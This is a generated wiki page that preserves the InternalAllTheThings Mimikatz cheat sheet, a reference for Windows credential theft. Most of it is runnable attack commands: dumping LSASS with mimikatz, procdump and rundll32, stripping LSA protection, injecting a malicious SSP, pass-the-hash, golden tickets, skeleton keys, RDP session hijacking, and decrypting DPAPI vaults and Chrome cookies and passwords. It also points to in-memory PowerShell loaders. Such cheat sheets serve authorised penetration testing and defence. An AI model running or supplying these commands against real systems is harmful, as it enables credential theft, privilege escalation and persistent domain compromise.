---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Mimikatz

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cheatsheets-mimikatz-cheatsheet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/mimikatz-cheatsheet.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Mimikatz](../../topics/cheatsheets/mimikatz.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cheatsheets-mimikatz-cheatsheet |
| name | Mimikatz |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/mimikatz-cheatsheet.md |

## Preserved Source Material

````yaml
_body: "# Mimikatz\n\n## Summary\n\n* [Execute commands](#execute-commands)\n* [Extract passwords](#extract-passwords)\n*\
  \ [LSA Protection Workaround](#lsa-protection-workaround)\n* [Mini Dump](#mini-dump)\n* [Pass The Hash](#pass-the-hash)\n\
  * [Golden ticket](#golden-ticket)\n* [Skeleton key](#skeleton-key)\n* [RDP Session Takeover](#rdp-session-takeover)\n* [RDP\
  \ Passwords](#rdp-passwords)\n* [Credential Manager & DPAPI](#credential-manager--dpapi)\n    * [Chrome Cookies & Credential](#chrome-cookies--credential)\n\
  \    * [Task Scheduled credentials](#task-scheduled-credentials)\n    * [Vault](#vault)\n* [Commands list](#commands-list)\n\
  * [Powershell version](#powershell-version)\n* [References](#references)\n\n![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)\n\
  \n## Execute commands\n\nOnly one command\n\n```powershell\nPS C:\\temp\\mimikatz> .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\"\
  \ exit\n```\n\nMimikatz console (multiple commands)\n\n```powershell\nPS C:\\temp\\mimikatz> .\\mimikatz\nmimikatz # privilege::debug\n\
  mimikatz # log\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest\n```\n\n## Extract passwords\n\n> Microsoft\
  \ disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2\
  \ / 2012 but clear text is still enabled.\n\n```powershell\nmimikatz_command -f sekurlsa::logonPasswords full\nmimikatz_command\
  \ -f sekurlsa::wdigest\n\n# to re-enable wdigest in Windows Server 2012+\n# in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\\
  Control\\SecurityProviders\\WDigest \n# create a DWORD 'UseLogonCredential' with the value 1.\nreg add HKLM\\SYSTEM\\CurrentControlSet\\\
  Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1\n```\n\n:warning: To take effect, conditions\
  \ are required :\n\n* Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:\n    * Adding requires lock\n    * Removing requires signout\n\
  * Win10:\n    * Adding requires signout\n    * Removing requires signout\n* Win2016:\n    * Adding requires lock\n    *\
  \ Removing requires reboot\n\n## LSA Protection Workaround\n\n* LSA as a Protected Process (RunAsPPL)\n\n  ```powershell\n\
  \  # Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1\n  reg query HKLM\\\
  SYSTEM\\CurrentControlSet\\Control\\Lsa\n\n  # Next upload the mimidriver.sys from the official mimikatz repo to same folder\
  \ of your mimikatz.exe\n  # Now lets import the mimidriver.sys to the system\n  mimikatz # !+\n\n  # Now lets remove the\
  \ protection flags from lsass.exe process\n  mimikatz # !processprotect /process:lsass.exe /remove\n\n  # Finally run the\
  \ logonpasswords function to dump lsass\n  mimikatz # privilege::debug    \n  mimikatz # token::elevate\n  mimikatz # sekurlsa::logonpasswords\n\
  \  \n  # Now lets re-add the protection flags to the lsass.exe process\n  mimikatz # !processprotect /process:lsass.exe\n\
  \n  # Unload the service created\n  mimikatz # !-\n\n\n  # https://github.com/itm4n/PPLdump\n  PPLdump.exe [-v] [-d] [-f]\
  \ <PROC_NAME|PROC_ID> <DUMP_FILE>\n  PPLdump.exe lsass.exe lsass.dmp\n  PPLdump.exe -v 720 out.dmp\n  ```\n\n* LSA is running\
  \ as virtualized process (LSAISO) by **Credential Guard**\n\n  ```powershell\n  # Check if a process called lsaiso.exe exists\
  \ on the running processes\n  tasklist |findstr lsaiso\n\n  # Lets inject our own malicious Security Support Provider into\
  \ memory\n  # require mimilib.dll in the same folder\n  mimikatz # misc::memssp\n\n  # Now every user session and authentication\
  \ into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\\
  mimilsa.log\n  ```\n\n## Mini Dump\n\nDump the lsass process with `procdump`\n\n> Windows Defender is triggered when a memory\
  \ dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) \"bypasses\"\
  \ that.\n\n```powershell\n# HTTP method - using the default way\ncertutil -urlcache -split -f http://live.sysinternals.com/procdump.exe\
  \ C:\\Users\\Public\\procdump.exe\nC:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# SMB method -\
  \ using the pid\nnet use Z: https://live.sysinternals.com\ntasklist /fi \"imagename eq lsass.exe\" # Find lsass's pid\n\
  Z:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp\n```\n\nDump the lsass process with `rundll32`\n\n```powershell\n\
  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full\n```\n\nUse the minidump:\n\
  \n* Mimikatz: `.\\mimikatz.exe \"sekurlsa::minidump lsass.dmp\"`\n\n  ```powershell\n  mimikatz # sekurlsa::minidump lsass.dmp\n\
  \  mimikatz # sekurlsa::logonPasswords\n  ```\n\n* Pypykatz: `pypykatz lsa minidump lsass.dmp`\n\n## Pass The Hash\n\n```powershell\n\
  mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell\n```\n\n##\
  \ Golden ticket\n\n```powershell\n.\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID\
  \ /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt\n```\n\n```powershell\n.\\mimikatz \"kerberos::golden /admin:DarthVader\
  \ /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321\
  \ /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit\n```\n\n## Skeleton key\n\n```powershell\nprivilege::debug\nmisc::skeleton\n\
  # map the share\nnet use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz\n# login as someone\nrdesktop 10.0.0.2:3389\
  \ -u test -p mimikatz -d pentestlab\n```\n\n## RDP Session Takeover\n\nUse `ts::multirdp` to patch the RDP service to allow\
  \ more than two users.\n\n* Enable privileges\n\n  ```powershell\n  privilege::debug \n  token::elevate \n  ```\n\n* List\
  \ RDP sessions\n\n  ```powershell\n  ts::sessions\n  ```\n\n* Hijack session\n\n  ```powershell\n  ts::remote /id:2 \n \
  \ ```\n\nRun `tscon.exe` as the SYSTEM user, you can connect to any session without a password.\n\n```powershell\n# get\
  \ the Session ID you want to hijack\nquery user\ncreate sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\"\nnet\
  \ start sesshijack\n```\n\n## RDP Passwords\n\nVerify if the service is running:\n\n```ps1\nsc queryex termservice\ntasklist\
  \ /M:rdpcorets.dll\nnetstat -nob | Select-String TermService -Context 1\n```\n\n* Extract passwords manually\n\n  ```ps1\n\
  \  procdump64.exe -ma 988 -accepteula C:\\svchost.dmp\n  strings -el svchost* | grep Password123 -C3\n  ```\n\n* Extract\
  \ passwords using Mimikatz\n\n  ```ps1\n  privilege::debug\n  ts::logonpasswords\n  ```\n\n## Credential Manager & DPAPI\n\
  \n```powershell\n# check the folder to find credentials\ndir C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\\
  *\n\n# check the file with mimikatz\n$ mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\\
  2647629F5AA74CD934ECD2F88D64ECD0\n\n# find master key\n$ mimikatz !sekurlsa::dpapi\n\n# use master key\n$ mimikatz dpapi::cred\
  \ /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n\
  ```\n\n### Chrome Cookies & Credential\n\n```powershell\n# Saved Cookies\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\\
  User Data\\Default\\Cookies\" /unprotect\ndpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\\
  Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b\n\
  \n# Saved Credential in Chrome\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n\
  ```\n\n### Task Scheduled credentials\n\n```powershell\nmimikatz(commandline) # vault::cred /patch\nTargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B}\
  \ / <NULL>\nUserName   : DOMAIN\\user\nComment    : <NULL>\nType       : 2 - domain_password\nPersist    : 2 - local_machine\n\
  Flags      : 00004004\nCredential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nAttributes : 0\n```\n\n### Vault\n\n```powershell\n\
  vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\"\n```\n\n## Commands list\n\n| Command |Definition|\n\
  |:----------------:|:---------------|\n| CRYPTO::Certificates|list/export certificates|\n|CRYPTO::Certificates | list/export\
  \ certificates|\n|KERBEROS::Golden | create golden/silver/trust tickets|\n|KERBEROS::List | list all user tickets (TGT and\
  \ TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality\
  \ of “klist”.|\n|KERBEROS::PTT | pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).|\n\
  |LSADUMP::DCSync | ask a DC to synchronize an object (get password data for account). No need to run code on DC.|\n|LSADUMP::LSA\
  \ | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory\
  \ domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such\
  \ as krbtgt with the parameter /name: “/name:krbtgt”|\n|LSADUMP::SAM | get the SysKey to decrypt SAM entries (from registry\
  \ or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local\
  \ accounts. This is used to dump all local credentials on a Windows computer.|\n|LSADUMP::Trust | Ask LSA Server to retrieve\
  \ Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).|\n\
  |MISC::AddSid | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group\
  \ name(s) (or SID). Moved to SID:modify as of May 6th, 2016.|\n|MISC::MemSSP | Inject a malicious Windows SSP to log locally\
  \ authenticated credentials.|\n|MISC::Skeleton | Inject Skeleton Key into LSASS process on Domain Controller. This enables\
  \ all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their\
  \ usual password.|\n|PRIVILEGE::Debug | get debug rights (this or Local System rights is required for many Mimikatz commands).|\n\
  |SEKURLSA::Ekeys | list Kerberos encryption keys|\n|SEKURLSA::Kerberos | List Kerberos credentials for all authenticated\
  \ users (including services and computer account)|\n|SEKURLSA::Krbtgt | get Domain Kerberos service account (KRBTGT)password\
  \ data|\n|SEKURLSA::LogonPasswords | lists all available provider credentials. This usually shows recently logged on user\
  \ and computer credentials.|\n|SEKURLSA::Pth | Pass- theHash and Over-Pass-the-Hash|\n|SEKURLSA::Tickets | Lists all available\
  \ Kerberos tickets for all recently authenticated users, including services running under the context of a user account\
  \ and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to\
  \ key export restrictions. sekurlsa can access tickets of others sessions (users).|\n|TOKEN::List | list all tokens of the\
  \ system|\n|TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin\
  \ token on the box|\n|TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.|\n\n## Powershell\
  \ version\n\nMimikatz in memory (no binary on disk) with :\n\n* [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)\
  \ from PowerShellEmpire\n* [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)\
  \ from PowerSploit\n\nMore information can be grabbed from the Memory with :\n\n* [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)\n\
  \n## References\n\n* [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)\n* [Skeleton\
  \ Key](https://pentestlab.blog/2018/04/10/skeleton-key/)\n* [Reversing Wdigest configuration in Windows Server 2012 R2 and\
  \ Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH](https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/)\n\
  * [Dumping RDP Credentials - MAY 24, 2021](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)"
_relative_path: cheatsheets/mimikatz-cheatsheet.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/mimikatz-cheatsheet.md
````
